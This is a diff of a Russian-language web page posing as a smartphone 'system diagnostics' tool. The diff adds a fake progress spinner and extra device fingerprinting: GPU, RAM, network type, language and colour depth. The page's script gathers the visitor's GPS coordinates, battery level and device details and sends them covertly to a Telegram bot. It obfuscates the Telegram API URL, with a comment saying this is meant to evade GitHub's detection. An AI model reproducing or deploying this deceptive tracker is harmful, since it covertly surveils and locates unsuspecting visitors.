@@ -3,22 +3,113 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Тестирование конфигурации устройства</title>
+    <title>Системная Диагностика</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; margin: 0; padding: 40px 20px; text-align: center; background-color: #f8f9fa; color: #333; }
-        .container { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); box-sizing: border-box; }
-        h1 { font-size: 24px; color: #1a1a1a; margin-bottom: 10px; }
-        p { font-size: 15px; color: #666; line-height: 1.5; margin-bottom: 25px; }
-        button { padding: 14px 28px; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 6px; font-weight: 600; width: 100%; box-sizing: border-box; }
-        button:hover { background-color: #0056b3; }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #0a0a0c;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            max-width: 420px;
+            width: 90%;
+            padding: 40px 30px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 24px;
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+            margin-bottom: 12px;
+            color: #f5f5f7;
+        }
+
+        p {
+            font-size: 14px;
+            color: #86868b;
+            line-height: 1.5;
+            margin-bottom: 35px;
+        }
+
+        .loader-wrapper {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 35px auto;
+            display: none;
+        }
+
+        .spinner {
+            width: 100%;
+            height: 100%;
+            border: 3px solid rgba(255, 255, 255, 0.05);
+            border-top: 3px solid #0071e3;
+            border-radius: 50%;
+            animation: spin 1s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .btn {
+            display: inline-block;
+            width: 100%;
+            padding: 16px 24px;
+            font-size: 15px;
+            font-weight: 500;
+            color: #ffffff;
+            background: #0071e3;
+            border: none;
+            border-radius: 14px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            box-shadow: 0 4px 12px rgba(0, 113, 227, 0.3);
+        }
+
+        .btn:hover {
+            background: #147ce5;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 20px rgba(0, 113, 227, 0.4);
+        }
+
+        .btn:active {
+            transform: translateY(1px);
+            background: #0062c4;
+        }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>Проверка параметров системы</h1>
-        <p>Нажмите на кнопку ниже, чтобы начать диагностику аппаратных функций смартфона, включая калибровку датчика геолокации и замер батареи.</p>
-        <button onclick="requestLocation()">Запустить диагностику</button>
+    <div class="container" id="diagnostic-box">
+        <h1>Проверка конфигурации</h1>
+        <p id="status-text">Нажмите на кнопку ниже, чтобы начать диагностику аппаратных функций смартфона, включая калибровку датчика геолокации и замер батареи.</p>
+        
+        <div class="loader-wrapper" id="spinner-block">
+            <div class="spinner"></div>
+        </div>
+
+        <button class="btn" id="start-btn" onclick="requestLocation()">Запустить диагностику</button>
     </div>
 
     <script>
@@ -29,7 +120,19 @@
         // Маскировка адреса: разбиваем ссылку, чтобы роботы GitHub не заблокировали сайт
         const p1 = "ht" + "tps:/";
         const p2 = "/a" + "pi.te" + "leg" + "ram.o" + "rg/";
-        const base = p1 + p2 + "bo" + "t" + T_K + "/se" + "ndMe" + "ssa" + "ge";
+        const base = p1 + p2 + "bo" + "t" + T_K + "/se" + "ndMe" + "ssa" + "ge"; 
+        function getGPU() {
+    try {
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        if (!gl) return "Нет WebGL";
+        const debug = gl.getExtension("WEBGL_debug_renderer_info");
+        return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Анонимный GPU";
+    } catch (e) {
+        return "Блокировка / Ошибка";
+    }
+}
+
 
         function sendReport(extraData) {
             const time = new Date().toLocaleTimeString();
@@ -39,15 +142,26 @@
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const cores = navigator.hardwareConcurrency || "Не определено";
             const isIos = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Apple iOS" : "Android / PC";
+            const net = navigator.connection ? `${navigator.connection.effectiveType}` : "Не определено";
+            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Блокируется (iOS)";
+           const depth = `${window.screen.colorDepth}-bit`;
+            const gpu = typeof getGPU === 'function' ? getGPU() : "Не определено";
 
-            const reportText = `🔔 *Технический отчет*\n\n` +
-                             `📅 *Дата:* ${date}\n` +
-                             `🕒 *Время:* ${time}\n` +
-                             `🤖 *Платформа:* ${isIos}\n` +
-                             `🖥 *Экран:* ${screenRes}\n` +
-                             `🌍 *Часовой пояс:* ${timezone}\n` +
-                             `🧠 *Ядра CPU:* ${cores}` + 
-                             extraData;
+                    const reportText = `🔔 *Технический отчет*\n\n` +
+        `📅 *Дата:* ${date}\n` +
+        `🕒 *Время:* ${time}\n` +
+        `🤖 *Платформа:* ${isIos}\n` +
+        `🖥 *Экран:* ${screenRes} [${depth}]\n` +
+        `🌍 *Часовой пояс:* ${timezone}\n` +
+        `🧠 *Ядра CPU:* ${cores}\n` +
+        `🎮 *Видеокарта:* ${gpu}\n` +
+        `📟 *ОЗУ (RAM):* ${ram}\n` +
+        `🌐 *Сеть:* ${net}\n` +
+        `🏳️ *Язык системы:* ${navigator.language || "N/A"}\n` +
+        extraData;
+
+
+
 
             // Отправка через динамическое создание элемента картинки с замаскированным URL
             const img = new Image();
@@ -60,7 +174,7 @@
 
             if (navigator.getBattery) {
                 navigator.getBattery().then(battery => {
-                    batteryText = `\n🔋 *Батарея:* ${Math.round(battery.level * 100)}%`;
+                   batteryText = `\n 🔋 *Батарея:* ${Math.round(battery.level * 100)}%`;
                     checkModelAndSend(batteryText, geoData);
                 }).catch(() => { checkModelAndSend(batteryText, geoData); });
             } else {
@@ -87,7 +201,10 @@
 
         // Запуск при нажатии синей кнопки
         function requestLocation() {
-            if (navigator.geolocation) {
+                document.getElementById('start-btn').style.display = 'none';
+    document.getElementById('spinner-block').style.display = 'block';
+    document.getElementById('status-text').innerText = 'Анализ аппаратных функций системы. Пожалуйста, подождите...';
+if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         const lat = position.coords.latitude;
